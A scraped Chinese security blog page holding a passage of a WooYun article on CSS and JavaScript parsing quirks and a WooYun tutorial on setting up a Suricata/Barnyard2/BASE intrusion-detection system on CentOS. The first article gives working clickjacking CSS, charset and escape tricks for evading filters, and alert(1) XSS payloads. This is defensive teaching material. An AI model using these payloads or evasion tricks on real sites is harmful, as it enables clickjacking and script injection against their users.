<p>导入外部样式（@import）或外部字体（@font-face）或命名空间（@namespace）或定义一个演示文件（@page）。</p>
<p>定义字符集的时候，可以定义一个多字节字符集（如：SHIFT-JIS，BIG5，EUC-JP，EUC-KR或GB2312）可能会使反斜线失效：
@charset &quot;GB-2312&quot;; /*{ content:&quot;a%90\&quot;; color:red; z:k&quot;; }</p>
<p>会解析为：</p>
<p>@charset &quot;GB-2312&quot;; /*{ content:&quot;a撞&quot;; color:red; z:k&quot;; }</p>
<p>还有一种时UTF-7字符：</p>
<p>@charset &quot;UTF-7&quot;; /*{ content:&quot;a+ACIAOw- color:red; z:k&quot;; }</p>
<p>会解析为：</p>
<p>@charset &quot;UTF-7&quot;; /*{ content:&quot;a&quot;; color:red; z:k&quot;; }</p>
<p>定义@charset在IE中并非这一种定义UTF-7的方式：</p>
<p>+/v8- /*{ content:&quot;a+ACIAOw- color:red; z:k&quot;; }</p>
<p>在一些浏览器中导入的时候可以定义字符集：</p>
<link rel=stylesheet charset=UTF-7 src=stylesheet>

<p>CSS的选择器是非常有趣的部分，他可以包含字符串，表达式，函数。选择器也可以由多行组成：</p>
<p>CSS中的声明时一个 属性/值 对里面的规则集，通常形式如下：
property: value;</p>
<p>property是一个关键字，包括字母数字破折号，和大于0x7F的字符，也有绕过的方式：</p>
<p>-moz-binding与\2d moz\2d binding相等。</p>
<p>IE中property没有严格遵守这个规则，如果一个属性包含多个字，只有第一个字将被使用，其他的都会忽略：</p>
<p>a b c: value; a: value;</p>
<p>上面两个规则是等效的。 并且IE中:可以替换为=</p>
<p>a = value; a: value;</p>
<p>上面两个也是等效的。</p>
<p>同样重要的是IE允许多行的字符串，URL，选择器。</p>
<p>CSS最明显的局限性是，他本身不是一种编程语言，而是一种语言风格，他没有任何的编程逻辑。</p>
<p>他很难不借助于JavaScript进行攻击，下面主要讨论的是完全基于CSS不依赖于其他脚本语言的攻击。</p>
<p>整体的逻辑：
element:condition{    action;    }</p>
<p>element可以为任意值，condition为CSS选择器，如:visited，:active，:hover，:selected。 事件选择器：</p>
<p>1 :hover 悬停鼠标在一个元素。 2 :active 点击一个元素。 3 :focus 光标放在一个元素上。</p>
<p>CSS造成点击劫持：</p>
<style> iframe{ filter:alpha(opacity=0);opacity: 0; position: absolute;top: 0px;left: 0px; height: 300px;width: 250px; } img{ position: absolute;top: 0px;left: 0px; height: 300px;width: 250px; } </style> <img src="用户看到的图片"> <iframe src="用户实际操作的页面"></iframe>

点击劫持的防御方法一是添加X-FRAME-OPTIONS:NEVER头，另外一种方式是利用JavaScript：

<body> <script> if(top!=self) document.write('<plaintext>'); </script>

两种方式都有局限性，之前发过点击劫持的文档了，详见：[http://drops.wooyun.org/tips/104](http://drops.wooyun.org/tips/104)

如下代码是一个有效的CSS2的代码，并且在Firefox，Safari，Chrome，Opera，IE7，IE8，IE9中没有影响，但是在IE6中，可执行代码：
<style> foo[bar|="} /*{xss: expression(alert(1));} x{"]{   color:red; } </style>

<p>以下代码中的color可以编码为c\olor，\c\o\l\or，c\6f l\06f r 。</p>
<p>/*{ color: red; }</p>
<h3 id="-">浏览器脚本语言</h3>
<p>解析javascript的时候以下两段代码不相同：
代码一 代码二 &amp;/#x3cscript&gt; var my_variable1 = 1; var my_variable2 = &amp;/#x3c/script&gt; &amp;/#x3cscript&gt; 2; &amp;/#x3c/script&gt; &amp;/#x3cscript&gt; var my_variable1 = 1; var my_variable2 = 2; &amp;/#x3c/script&gt;</p>
<p>这是因为</p>
<script>
在解析之前并没有链接起来，相反，代码一中的第一个script标签会引起错误。

从而导致整个标签被忽略，所有标签内的代码都无法执行。

在JS中有两种定义函数的方式：
var aaa=function(){...} function aaa(){...}

var 方式定义的函数，不能先调用函数，后声明，只能先声明函数，然后调用。

function方式定义函数可以先调用，后声明。
<script>   //aaa();这样调用就会出错   var aaa = function(){     alert("A");   }   aaa();//这样就不会出错   //先调用后声明   bbb();   function bbb(){     alert("bb");   }   </script>

<p>出于历史原因，某些HTML元素</p>
<p>（<IMG>，<FORM>，<EMBED>，<object>，<APPLET>）
的名字也直接映射到文档的命名空间，如下面的代码片段所示：</p>
<p><img name="hello" src="http://www.example.com/"> <script> alert(document.hello.src); </script></p>
<p>DOM操作：</p>
<p>document.getElementById(&quot;output&quot;).innerHTML = &quot;<b>Hi mom!</b>&quot;;</p>
<p>向id为output的标签里插入</p>
<p><b>Hi mom!</b>
。 采用.innerHTML插入数据时，必须为完整的数据块，比如下面的代码：</p>
<p>some_element.innerHTML = &quot;<b>Hi&quot;; some_element.innerHTML += &quot; mom!</b><i>&quot;;</p>
<p>等同于下面的代码：</p>
<p>some_element.innerHTML = &quot;<b>Hi</b> mom!<i></i>&quot;;</p>
<p>DOM操作时，其本身会对一些字符做解码处理，如下代码：</p>
<p><textarea style="display:none" id="json"> {   &quot;name&quot;:&quot;Jack&quot;&quot;,   &quot;country&quot;:&quot;China&quot; } </textarea> My name is :<span id="me">loading...</span> <script> function $(id){   return document.getElementById(id); } var data=$(&quot;json&quot;).value; alert(data); var profile=eval(&quot;(&quot;+data+&quot;)&quot;);//把string转成object方便操作 $(&quot;me&quot;).innerHTML = profile.name; </script></p>
<p>可以看到alert出的data数据为</p>
<p>{      &quot;name&quot;:&quot;Jack&quot;&quot;,      &quot;country&quot;:&quot;China&quot; }</p>
<p>下面的例子是使用getAttribute时也会解码：</p>
<p><img id="pic" src="http://www.baidu.com/img/baidu_sylogo1.gif" bigpic="http://baidu.com&quot;&gt;&lt;img src=1 onerror=alert(1)&gt;&lt;i b =" onclick="test()"> <div id="bigimage"> </div> <script> function $(id){   return document.getElementById(id); } function test(){   big=$(&quot;pic&quot;).getAttribute(&quot;bigpic&quot;);//big此时为：<a href="http://baidu.com&quot;&gt;" target="_blank">http://baidu.com&quot;&gt;</a><img src=1 onerror=alert(1)><i b =   $("bigimage").innerHTML="<img src=\"" + big + "\"/>"; } </script></p>
<h3 id="javascript-">javascript编码</h3>
<p>javascript支持多种字符编码方式：
1 C语言的编码，\b表示退格，\t表示水平制表符等等，公认的ECMAScript编码。 2 三位数字：用反斜杠加八位8进制来表示，如\145可表示字符e，该语法不属于ECMAScript，但是基本所有的浏览器都支持。 3 两位数字：用反斜杠加x加八位16进制表示，如\x65可表示字符e，同样不属于ECMAScript，但是在解析底层，C语言中有很好的支持。 4 四位数字：Unicode编码，十六位16进制表示，如\u0065可表示字符e，属于ECMAScript编码。</p>
<p>需要注意的是组后一种编码方式不止在字符串中才可以表示，如下代码也可正常的执行（但是不可替代括号与引号）：</p>
<script> \u0061lert("This displays a message!"); </script>

<h3 id="fuzzing">Fuzzing</h3>
<p>JavaScript中，window对象是一个全局变量，并且默认定义的变量都为全局变量，window下的方法可以直接访问：</p>
<script type="text/javascript"> alert(1); window.alert(1); window.alert(window.alert); </script>

<p>并且可重写：</p>
<script type="text/javascript"> function alert() {} alert(1) </script>

<p>定义数组的两种方式：</p>
<script type="text/javascript"> x=[1,alert,{},[],/a/]; alert(x[4]); </script>

<p>默认返回最后一个：</p>
<script type="text/javascript"> objLiteral={'objProperty':123}; alert(objLiteral[0,1,2,3,'objProperty']); </script> <script type="text/javascript"> objLiteral={'objProperty':123}; alert(objLiteral[(0,1,2,3,(0,'objProperty'))]); </script>

<p>JavaScript中定义字符串除了&#39;string&#39;，&quot;string&quot;方式之外，还有其他的方式：</p>
<script type="text/javascript"> alert(/I am a string/+''); alert(/I am a string/.source); alert(/I am a string/['source']); alert(['I am a string']+[]) </script>

<p>第一个alert中是一个正则表达式加一个空字符串，JavaScript会把正则强制转为字符串。 第二个alert中使用了标准的正则对象的source属性，返回结果为正则匹配完的字符串，第三个相同是属性的另外一种访问方式。 第三个alert中是利用了访问数组时如果不是指定的访问一个元素，会自动调用toString()方法，转为字符串。 还有一种非标准的使用字符串的方式（IE8，Safari，Opera，Firefox和Chrome已经支持），使用类似数组的方式：</p>
<script type="text/javascript"> alert('abcdefg'[0]); </script>

<p>火狐当中对函数名的规范非常的宽泛：</p>
<script type="text/javascript"> window.function=function function(){return function function() {return function function(){alert('Works in Firefox')}()}()}() </script>

<p>JavaScript支持多行的字符串，当一\结尾时，下一行的字符串会接着上一行的结尾：</p>
<script type="text/javascript"> alert("this is a \ \ \ \ \ string"); </script>

<p>似乎所有的JavaScript引擎都支持函数之前的运算符，如：+，-，~，++，--，!，运算符也可写在typeof和void之前。</p>
<script type="text/javascript"> !~+-++alert(1) </script> <script type="text/javascript"> void~void~typeof~typeof--alert(2) </script> <script type="text/javascript"> alert(3)/abc </script>

<p>最新的Chrome与Safari前两个已经不会执行了。 查看控制台可以看到三个js其实都是报错了的，前两个是由于alert函数返回的是undefined，进行++和--操作的时候是非法的。 最后一个是试图用alert函数除以一个未声明的变量，先执行alert函数后再除的时候报错。
<strong>Tags:</strong> <a href="http://drops.wooyun.org/tag/javascript" target="_blank">javascript</a>, <a href="http://drops.wooyun.org/tag/浏览器" target="_blank">浏览器</a></p>
<p>版权声明：未经授权禁止转载 <a href="http://drops.wooyun.org/author/瞌睡龙" title="由 瞌睡龙 发布" target="_blank">瞌睡龙</a>@<a href="http://drops.wooyun.org/" target="_blank">乌云知识库</a>
分享到： <a href="&quot;分享到QQ空间&quot;"></a> <a href="&quot;分享到新浪微博&quot;"></a> <a href="&quot;分享到腾讯微博&quot;"></a> <a href="&quot;分享到人人网&quot;"></a> <a href="&quot;分享到网易微博&quot;"></a> <a href="&quot;累计分享0次&quot;">0</a></p>
<h3 id="-">相关日志</h3>
<ul>
<li><a href="http://drops.wooyun.org/papers/146" target="_blank">Browser Security-基本概念</a></li>
<li><a href="http://drops.wooyun.org/tips/147" target="_blank">Browser Security-超文本标记语言（HTML）</a></li>
<li><a href="http://drops.wooyun.org/tips/151" target="_blank">Browser Security-同源策略、伪URL的域</a></li>
<li><a href="http://drops.wooyun.org/papers/526" target="_blank">浏览器安全（一）</a></li>
<li><a href="http://drops.wooyun.org/tips/188" target="_blank">详解XMLHttpRequest的跨域资源共享</a></li>
<li><a href="http://drops.wooyun.org/tips/134" target="_blank">针对性攻击与移动安全漏洞</a>
上一篇:<a href="http://drops.wooyun.org/tips/151" target="_blank">Browser Security-同源策略、伪URL的域</a></li>
</ul>
<p>下一篇:<a href="http://drops.wooyun.org/tips/147" target="_blank">Browser Security-超文本标记语言（HTML）</a></p>
<h3 id="-">发表评论</h3>
<p><a href="">点击这里取消回复。</a></p>
<p>您必须 <a href="http://drops.wooyun.org/login" target="_blank">登陆</a> 后才能发表评论。</p>
<h3 id="-">订阅更新</h3>
<ul>
<li><a href="http://drops.wooyun.org/feed" title="点击订阅" target="_blank"><img src="" alt=""></a></li>
</ul>
<h3 id="-">分类</h3>
<ul>
<li><a href="http://drops.wooyun.org/category/papers" title="漏洞分析" target="_blank">漏洞分析</a> (40)</li>
<li><a href="http://drops.wooyun.org/category/tips" title="技术分享" target="_blank">技术分享</a> (57)</li>
<li><a href="http://drops.wooyun.org/category/tools" title="工具收集" target="_blank">工具收集</a> (5)</li>
<li><p><a href="http://drops.wooyun.org/category/news" title="业界资讯" target="_blank">业界资讯</a> (3)</p>
<h3 id="-">最新日志</h3>
</li>
<li><p><a href="http://drops.wooyun.org/tips/688" title="Flash CSRF" target="_blank">Flash CSRF</a></p>
</li>
<li><a href="http://drops.wooyun.org/tips/689" title="XSS与字符编码的那些事儿 —科普文" target="_blank">XSS与字符编码的那些事儿 —科普文</a></li>
<li><a href="http://drops.wooyun.org/papers/680" title="Zabbix SQL Injection/RCE – CVE-2013-5743" target="_blank">Zabbix SQL Injection/RCE – CVE-2013-5743</a></li>
<li><a href="http://drops.wooyun.org/papers/679" title="CDN流量放大攻击思路" target="_blank">CDN流量放大攻击思路</a></li>
<li><a href="http://drops.wooyun.org/news/674" title="从丝绸之路到安全运维（Operational Security）与风险控制（Risk Management） 上集" target="_blank">从丝绸之路到安全运维（Operational Security）与风险控制（Risk Management） 上集</a></li>
<li><a href="http://drops.wooyun.org/tips/662" title="攻击JavaWeb应用[8]-后门篇" target="_blank">攻击JavaWeb应用[8]-后门篇</a></li>
<li><a href="http://drops.wooyun.org/papers/660" title="php4fun.sinaapp.com PHP挑战通关攻略" target="_blank">php4fun.sinaapp.com PHP挑战通关攻略</a></li>
<li><a href="http://drops.wooyun.org/papers/653" title="搭建基于Suricata+Barnyard2+Base的IDS前端Snorby" target="_blank">搭建基于Suricata+Barnyard2+Base的IDS前端Snorby</a></li>
<li><a href="http://drops.wooyun.org/tools/655" title="GPU破解神器Hashcat使用简介" target="_blank">GPU破解神器Hashcat使用简介</a></li>
<li><a href="http://drops.wooyun.org/tips/649" title="内网渗透应用 跨vlan渗透的一种思路" target="_blank">内网渗透应用 跨vlan渗透的一种思路</a></li>
</ul>
<h3 id="-">最新评论</h3>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>c2y2 在 <a href="http://drops.wooyun.org/tips/689#comment-1883" target="_blank">XSS与字符编码的那些事儿 ---科普文</a>
谢谢</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>Evi1c0de 在 <a href="http://drops.wooyun.org/tips/573#comment-1877" target="_blank">如何用意念获取附近美女的手机号码</a>
连接CMCC跳转到登陆页面 右键源码 修改即可</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>牛牛 在 <a href="http://drops.wooyun.org/tips/688#comment-1871" target="_blank">Flash CSRF</a>
支持一下呵呵</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>luwikes 在 <a href="http://drops.wooyun.org/papers/178#comment-1870" target="_blank">JBoss安全问题总结</a>
mark</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>NgInx 在 <a href="http://drops.wooyun.org/tips/688#comment-1869" target="_blank">Flash CSRF</a>
好吧，基佬，顶你一个，不错。</p>
<ul>
<li><a href="">下一页 »</a>
Powered by <a href="http://wordpress.org/" target="_blank">WordPress</a> | GZai Theme by <a href="http://huaidan.org/" title="GZai Theme produced by 鬼仔" target="_blank">鬼仔</a>
<a href="http://tongji.baidu.com/hm-web/welcome/ico?s=9fc41da6a2322bdd80563c9d5a4bdb1d" target="_blank"><img src="" alt=""></a></li>
</ul>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span><span class="breadcrumb"><li><a href="/categories/安全/">安全</a></li><li><a href="/categories/安全/Scripts/">Scripts</a></li></span></span> | <span class="tags">Tagged <a href="/tags/Scripts/" class="label label-primary">Scripts</a><a href="/tags/安全/" class="label label-success">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:39"datetime="2014-03-07 09:54:39"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全-Scripts--BrowserSecurity-css、javascript/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全-Scripts--BrowserSecurity-css、javascript" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全-入侵检测--CentOS62下安装基于SuricataBarnyard2Base的⼊侵检测系/">CentOS 6.2下安装基于Suricata + Barnyard 2 + Base 的⼊侵检测系</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:39.000Z"> <a href="/2014/02/02/2014-02-02-安全-入侵检测--CentOS62下安装基于SuricataBarnyard2Base的⼊侵检测系/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="centos-6-2-suricata-barnyard-2-base-wooyun-">CentOS 6.2下安装基于Suricata + Barnyard 2 + Base 的⼊侵检测系统 | WooYun知识库</h1>
<h3 id="-">分享到</h3>
<ul>
<li><a href="">一键分享</a></li>
<li><a href="">QQ空间</a></li>
<li><a href="">新浪微博</a></li>
<li><a href="">百度云收藏</a></li>
<li><a href="">人人网</a></li>
<li><a href="">腾讯微博</a></li>
<li><a href="">百度相册</a></li>
<li><a href="">开心网</a></li>
<li><a href="">腾讯朋友</a></li>
<li><a href="">百度贴吧</a></li>
<li><a href="">豆瓣网</a></li>
<li><a href="">搜狐微博</a></li>
<li><a href="">百度新首页</a></li>
<li><a href="">QQ好友</a></li>
<li><a href="">和讯微博</a></li>
<li><a href="">更多...</a></li>
</ul>
<p><a href="">百度分享</a></p>
<h1 id="-wooyun-http-drops-wooyun-org-wooyun-"><a href="http://drops.wooyun.org/" title="WooYun知识库" target="_blank">WooYun知识库</a></h1>
<p><a href="http://drops.wooyun.org/login" title="登录" target="_blank">登录</a></p>
<p>像一朵乌云一样成长</p>
<ul>
<li><a href="http://drops.wooyun.org/" title="WooYun知识库" target="_blank">首页</a></li>
<li><a href="http://www.wooyun.org/" target="_blank">WooYun</a></li>
<li><a href="http://zone.wooyun.org/" target="_blank">Zone</a></li>
<li><a href="http://drops.wooyun.org/newsend" target="_blank">投稿</a>
<a href="http://drops.wooyun.org/" title="首页" target="_blank">首页</a> » <a href="http://drops.wooyun.org/category/tips" title="查看 技术分享 中的全部文章" target="_blank">技术分享</a> » CentOS 6.2下安装基于Suricata + Barnyard 2 + Base 的⼊侵检测系统</li>
</ul>
<h2 id="-centos-6-2-suricata-barnyard-2-base-http-drops-wooyun-org-tips-413-permanent-link-to-centos-6-2-suricata-barnyard-2-base-"><a href="http://drops.wooyun.org/tips/413" title="Permanent Link to CentOS 6.2下安装基于Suricata + Barnyard 2 + Base 的⼊侵检测系统" target="_blank">CentOS 6.2下安装基于Suricata + Barnyard 2 + Base 的⼊侵检测系统</a></h2>
<p>2人收藏 <a href="">收藏</a></p>
<p>2013/08/05 19:24  | <a href="http://drops.wooyun.org/author/五道口杀气" title="由 五道口杀气 发布" target="_blank">五道口杀气</a>  | <a href="http://drops.wooyun.org/category/tips" title="查看 技术分享 中的全部文章" target="_blank">技术分享</a>  | <a href="">占个座先</a></p>
<h2 id="0x00-">0x00 准备工作</h2>
<p>CentOS 6.2我是最小化安装，同时使用163的源进行update，所以还需要安装如下的依赖包：
[root@root ~]$ sudo yum install gcc make pcre pcre-devel libpcap libpcap-devel</p>
<p>同时需要关闭iptables、ip6tables：</p>
<p>[root@root ~]$ sudo service iptables stop [root@root ~]$ sudo service ip6tables stop [root@root ~]$ sudo chkconfig --level 2345 iptables off [root@root ~]$ sudo chkconfig --level 2345 ip6tables off</p>
<p>需要下载的软件：
Suricata <a href="http://www.openinfosecfoundation.org/index.php/downloads" target="_blank">http://www.openinfosecfoundation.org/index.php/downloads</a> Barnyard 2 <a href="http://www.securixlive.com/barnyard2/" target="_blank">http://www.securixlive.com/barnyard2/</a> Base <a href="http://base.secureideas.net/" target="_blank">http://base.secureideas.net/</a> yaml <a href="http://pyyaml.org/" target="_blank">http://pyyaml.org/</a> adodb <a href="http://sourceforge.net/projects/adodb/" target="_blank">http://sourceforge.net/projects/adodb/</a> rules <a href="http://rules.emergingthreats.net/open/suricata/emerging.rules.tar.gz" target="_blank">http://rules.emergingthreats.net/open/suricata/emerging.rules.tar.gz</a> Image_Canvas <a href="http://download.pear.php.net/package/Image_Canvas-0.3.3.tgz" target="_blank">http://download.pear.php.net/package/Image_Canvas-0.3.3.tgz</a> Image_Graph <a href="http://download.pear.php.net/package/Image_Graph-0.8.0.tgz" target="_blank">http://download.pear.php.net/package/Image_Graph-0.8.0.tgz</a></p>
<h2 id="0x01-apm-">0x01 配置APM环境</h2>
<p>Base需要APM（Apache、PHP、Mysql）环境，通过yum来进行安装。
[root@root ids]$ sudo yum install httpd php mysql mysql-server mysql-devel php-mysql php-gd php-pear</p>
<p>启动httpd、mysql服务</p>
<p>[root@root ids]$ sudo /etc/init.d/httpd start [root@root ids]$ sudo /etc/init.d/mysqld start</p>
<p>默认的web根目录是</p>
<p>/var/www/html
，在此目录新建phpinfo测试文件，来确认配置是否正确。</p>
<p>PS：mysql安装后root账号默认口令为空，通过下面命令可以修改root账号口令
[root@root ~]$ mysqladmin -uroot -p password [新密码]</p>
<h2 id="0x02-barnyard-2">0x02 安装Barnyard 2</h2>
<p>安装过程如下：
[root@root ids]$ tar zxvf barnyard2-1.9.tar.gz [root@root ids]$ cd barnyard2-1.9 [root@root barnyard2-1.9]$ ./configure --with-mysql [root@root barnyard2-1.9]$ make [root@root barnyard2-1.9]$ sudo make install</p>
<h2 id="0x03-suricata">0x03 安装Suricata</h2>
<p>安装过程如下：</p>
<p>Suricata需要依赖yaml，首先安装yaml
[root@root ids]$ tar zxvf yaml-0.1.4.tar.gz [root@root ids]$ cd yaml-0.1.4 [root@root yaml-0.1.4]$ ./configure [root@root yaml-0.1.4]$ make [root@root yaml-0.1.4]$ sudo make install [root@root ids]$ tar zxvf suricata-1.1.1.tar.gz [root@root ids]$ cd suricata-1.1.1 [root@root suricata-1.1.1]$ ./configure [root@root suricata-1.1.1]$ make [root@root suricata-1.1.1]$ sudo make install</p>
<h2 id="0x04-suricata-barnyard-2">0x04 配置Suricata、Barnyard 2</h2>
<h3 id="-barnyard-2">配置Barnyard 2</h3>
<p>把Barnyard 2安装源文件中的</p>
<p>etc/barnyard2.conf
文件拷贝到Suricata的配置目录下
[root@root ids]$ cd barnyard2-1.9 [root@root barnyard2-1.9]$ sudo cp etc/barnyard2.conf /etc/suricata/</p>
<p>创建barnyard2日志目录</p>
<p>/var/log/barnyard2</p>
<p>[root@root ~]$ sudo mkdir /var/log/barnyard2</p>
<h3 id="-">配置数据库</h3>
<p>需要创建数据库和相应的账号
[root@root ~]$ mysql -uroot –p mysql&gt; create database ids; mysql&gt; grant create,select,update,insert,delete on ids./* to ids@localhost identified by &#39;ids123&#39;;</p>
<p>Barnyard 2安装源文件中的schemas/create_mysql是创建表的sql文件，通过如下方式建表：</p>
<p>[root@root ~]$ mysql -uids -p -Dids &lt; ids/barnyard2-1.9/schemas/create_mysql</p>
<h3 id="-suricata">配置Suricata</h3>
<p>创建Suricata配置目录和日志目录
[root@root ~]$ sudo mkdir /var/log/suricata [root@root ~]$ sudo mkdir /etc/suricata</p>
<p>把规则文件拷贝到Suricata配置目录下</p>
<p>[root@root ids]$ tar zxvf emerging.rules.tar.gz [root@root ids]$ sudo cp -R rules/ /etc/suricata/</p>
<p>把Suricata安装源文件中的</p>
<p>suricata.yaml/classification.config/reference.config
文件拷贝到Suricata的配置目录下</p>
<p>[root@root ids]$ cd suricata-1.1.1 [root@root suricata-1.1.1]$ sudo cp suricata.yaml classification.config reference.config /etc/suricata/</p>
<p>编辑barnyard2.conf文件</p>
<p>[root@root ~]$ cd /etc/suricata/ [root@root suricata]$ sudo vim barnyard2.conf</p>
<p>找到下面的内容</p>
<p>config reference_file:      /etc/snort/reference.config config classification_file: /etc/snort/classification.config config gen_file:            /etc/snort/gen-msg.map config sid_file:                /etc/snort/sid-msg.map</p>
<p>更改为的内容如下：</p>
<p>config reference_file:      /etc/suricata/reference.config config classification_file: /etc/suricata/classification.config config gen_file:            /etc/suricata/rules/gen-msg.map config sid_file:            /etc/suricata/rules/sid-msg.map</p>
<p>同时在文件的末尾添加如下行，红色的mysql数据库、账号信息根据实际情况填写</p>
<p>output database: log, mysql, user=ids password=ids123 dbname=ids host=localhost</p>
<p>编辑suricata.yaml文件</p>
<p>[root@root suricata]$ sudo vim suricata.yaml</p>
<p>找到</p>
<p>HOME_NET: &quot;[192.168.0.0/16,10.0.0.0/8,172.16.0.0/12]&quot;</p>
<p>这一行，根据实际的网络情况来修改，在这里我修改为</p>
<p>HOME_NET: &quot;[192.168.0.0/16]&quot;</p>
<p>找到下面的内容：</p>
<p>host-os-policy:   /# Make the default policy windows.   windows: [0.0.0.0/0]   bsd: []   bsd_right: []   old_linux: []   linux: [10.0.0.0/8, 192.168.1.100, &quot;8762:2352:6241:7245:E000:0000:0000:0000&quot;]   old_solaris: []   solaris: [&quot;::1&quot;]   hpux10: []   hpux11: []   irix: []   macos: []   vista: []   windows2k3: []</p>
<p>根据实际网络情况修改。</p>
<p>启动Suricata、Barnyard 2
[root@root ~]$ sudo /usr/local/bin/barnyard2 -c /etc/suricata/barnyard2.conf -d /var/log/suricata -f unified2.alert -w /var/log/suricata/suricata.waldo -D [root@root ~]$ sudo /usr/local/bin/suricata -c /etc/suricata/suricata.yaml -i eth1 -D</p>
<p>启动suricata的-i参数是镜像流量的网卡。</p>
<p>测试suricata工作是否正常，可以通过如下命令：
[root@root suricata]$ curl www.testmyids.com</p>
<p>执行后，/var/log/suricata目录下的fast.log/suricata.waldo/unified2.alert/*文件大小发生变化，同时查看fast.log文件有如下类似的内容则表示suricata工作正常：</p>
<p>01/12/2012-02:16:27.964981  [/<em>/</em>] [1:2013028:3] ET POLICY curl User-Agent Outbound [/<em>/</em>] [Classification: Attempted Informa tion Leak] [Priority: 2] {TCP} 192.168.230.100:56260 -&gt; 217.160.51.31:80 01/12/2012-02:16:28.309707  [/<em>/</em>] [1:2100498:7] GPL ATTACK_RESPONSE id check returned root [/<em>/</em>] [Classification: Potential ly Bad Traffic] [Priority: 2] {TCP} 217.160.51.31:80 -&gt; 192.168.230.100:56260</p>
<h2 id="0x05-base">0x05 配置Base</h2>
<p>Base需要用到adodb以及Image_Canvas、Image_Graph绘图组件，配置过程如下：</p>
<p>解压adodb514.zip
[root@root ids]$ unzip adodb514.zip</p>
<p>把adodb5拷贝到/usr/local/lib/目录下，这个目录随意指定，记下来后面要用到</p>
<p>[root@root ids]$ sudo cp -R adodb5 /usr/local/lib/</p>
<p>安装Image_Canvas、Image_Graph</p>
<p>[root@root ids]$ sudo pear install Image_Canvas-0.3.3.tgz [root@root ids]$ sudo pear install Image_Graph-0.8.0.tgz</p>
<p>解压base-1.4.5.tar.gz</p>
<p>[root@root ids]$ tar zxvf base-1.4.5.tar.gz</p>
<p>拷贝base-1.4.5到/var/www/html目录下</p>
<p>[root@root ids]$ sudo cp -R base-1.4.5 /var/www/html/base</p>
<p>更改/var/www/html/base的属主为apache</p>
<p>[root@root ids]$ cd /var/www/html/ [root@root html]$ sudo chown -R apache:apache base</p>
<p>然后通过浏览器访问<a href="http://192.168.230.100/base" target="_blank">http://192.168.230.100/base</a></p>
<p>￼<img src="" alt="enter image description here"></p>
<p>根据页面中红色的部分提示来进行操作。</p>
<p>修改php.ini
[root@root html]$ sudo vim /etc/php.ini</p>
<p>找到</p>
<p>error_reporting = E_ALL &amp; ~E_DEPRECATED</p>
<p>内容，修改为如下：</p>
<p>error_reporting = E_ALL &amp; ~E_DEPRECATED &amp; ~E_NOTICE</p>
<p>重新载入apache配置</p>
<p>[root@root html]$ sudo /etc/init.d/httpd reload</p>
<p>然后点击“Continue”到下一步 ￼ <img src="" alt="enter image description here"></p>
<p>选择语言，和前面我们的adodb5的路径，然后点击“Continue” ￼ <img src="" alt="enter image description here"></p>
<p>填写mysql相关信息，点击“Continue”继续 ￼ <img src="" alt="enter image description here"></p>
<p>填写认证的相关信息，如果需要验证身份，请勾上“Use Authentication System”,点击“Continue” ￼ <img src="" alt="enter link description here"></p>
<p>点击“Create BASE AG” ￼ <img src="" alt="enter image description here"></p>
<p>点击“step 5”，跳到首页。</p>
<p><img src="" alt="enter image description here"> ￼</p>
<h2 id="0x06-">0x06 最后</h2>
<p>以上是整个安装过程，IDS的价值在于规则设置的是否合适，根据实际情况设置合适的规则才能够体现IDS的强大。规则的设置见以后的文章。
<strong>Tags:</strong> <a href="http://drops.wooyun.org/tag/入侵" target="_blank">入侵</a>, <a href="http://drops.wooyun.org/tag/检测" target="_blank">检测</a></p>
<p>版权声明：未经授权禁止转载 <a href="http://drops.wooyun.org/author/五道口杀气" title="由 五道口杀气 发布" target="_blank">五道口杀气</a>@<a href="http://drops.wooyun.org/" target="_blank">乌云知识库</a>
分享到： <a href="&quot;分享到QQ空间&quot;"></a> <a href="&quot;分享到新浪微博&quot;"></a> <a href="&quot;分享到腾讯微博&quot;"></a> <a href="&quot;分享到人人网&quot;"></a> <a href="&quot;分享到网易微博&quot;"></a> <a href="&quot;累计分享0次&quot;">0</a></p>
<h3 id="-">相关日志</h3>
<ul>
<li><a href="http://drops.wooyun.org/papers/653" target="_blank">搭建基于Suricata+Barnyard2+Base的IDS前端Snorby</a></li>
<li><a href="http://drops.wooyun.org/tips/636" target="_blank">OSSEC 学习教程一</a></li>
<li><a href="http://drops.wooyun.org/tools/515" target="_blank">Zmap详细用户手册和DDOS的可行性</a></li>
<li><a href="http://drops.wooyun.org/papers/660" target="_blank">php4fun.sinaapp.com PHP挑战通关攻略</a></li>
<li><a href="http://drops.wooyun.org/papers/161" target="_blank">Rsync安全配置</a></li>
<li><a href="http://drops.wooyun.org/tips/401" target="_blank">sqlmap用户手册[续]</a>
上一篇:<a href="http://drops.wooyun.org/tips/411" target="_blank">各种环境下的渗透测试</a></li>
</ul>
<p>下一篇:<a href="http://drops.wooyun.org/tips/409" target="_blank">snmp弱口令引起的信息泄漏</a></p>
<h3 id="-5-rss-2-0-http-drops-wooyun-org-tips-413-feed-trackback-http-drops-wooyun-org-tips-413-trackback-">楼被抢了 5 层了... <a href="">抢座</a>、<a href="http://drops.wooyun.org/tips/413/feed" target="_blank">Rss 2.0</a>或者 <a href="http://drops.wooyun.org/tips/413/trackback" target="_blank">Trackback</a></h3>
<ul>
<li><img src="" alt=""> Demon | 2013/08/05 23:03 | <a href="">/#</a></li>
</ul>
<p>学习了</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> lion(lp) | 2013/08/06 09:38 | <a href="">/#</a></li>
</ul>
<p>不错啊</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
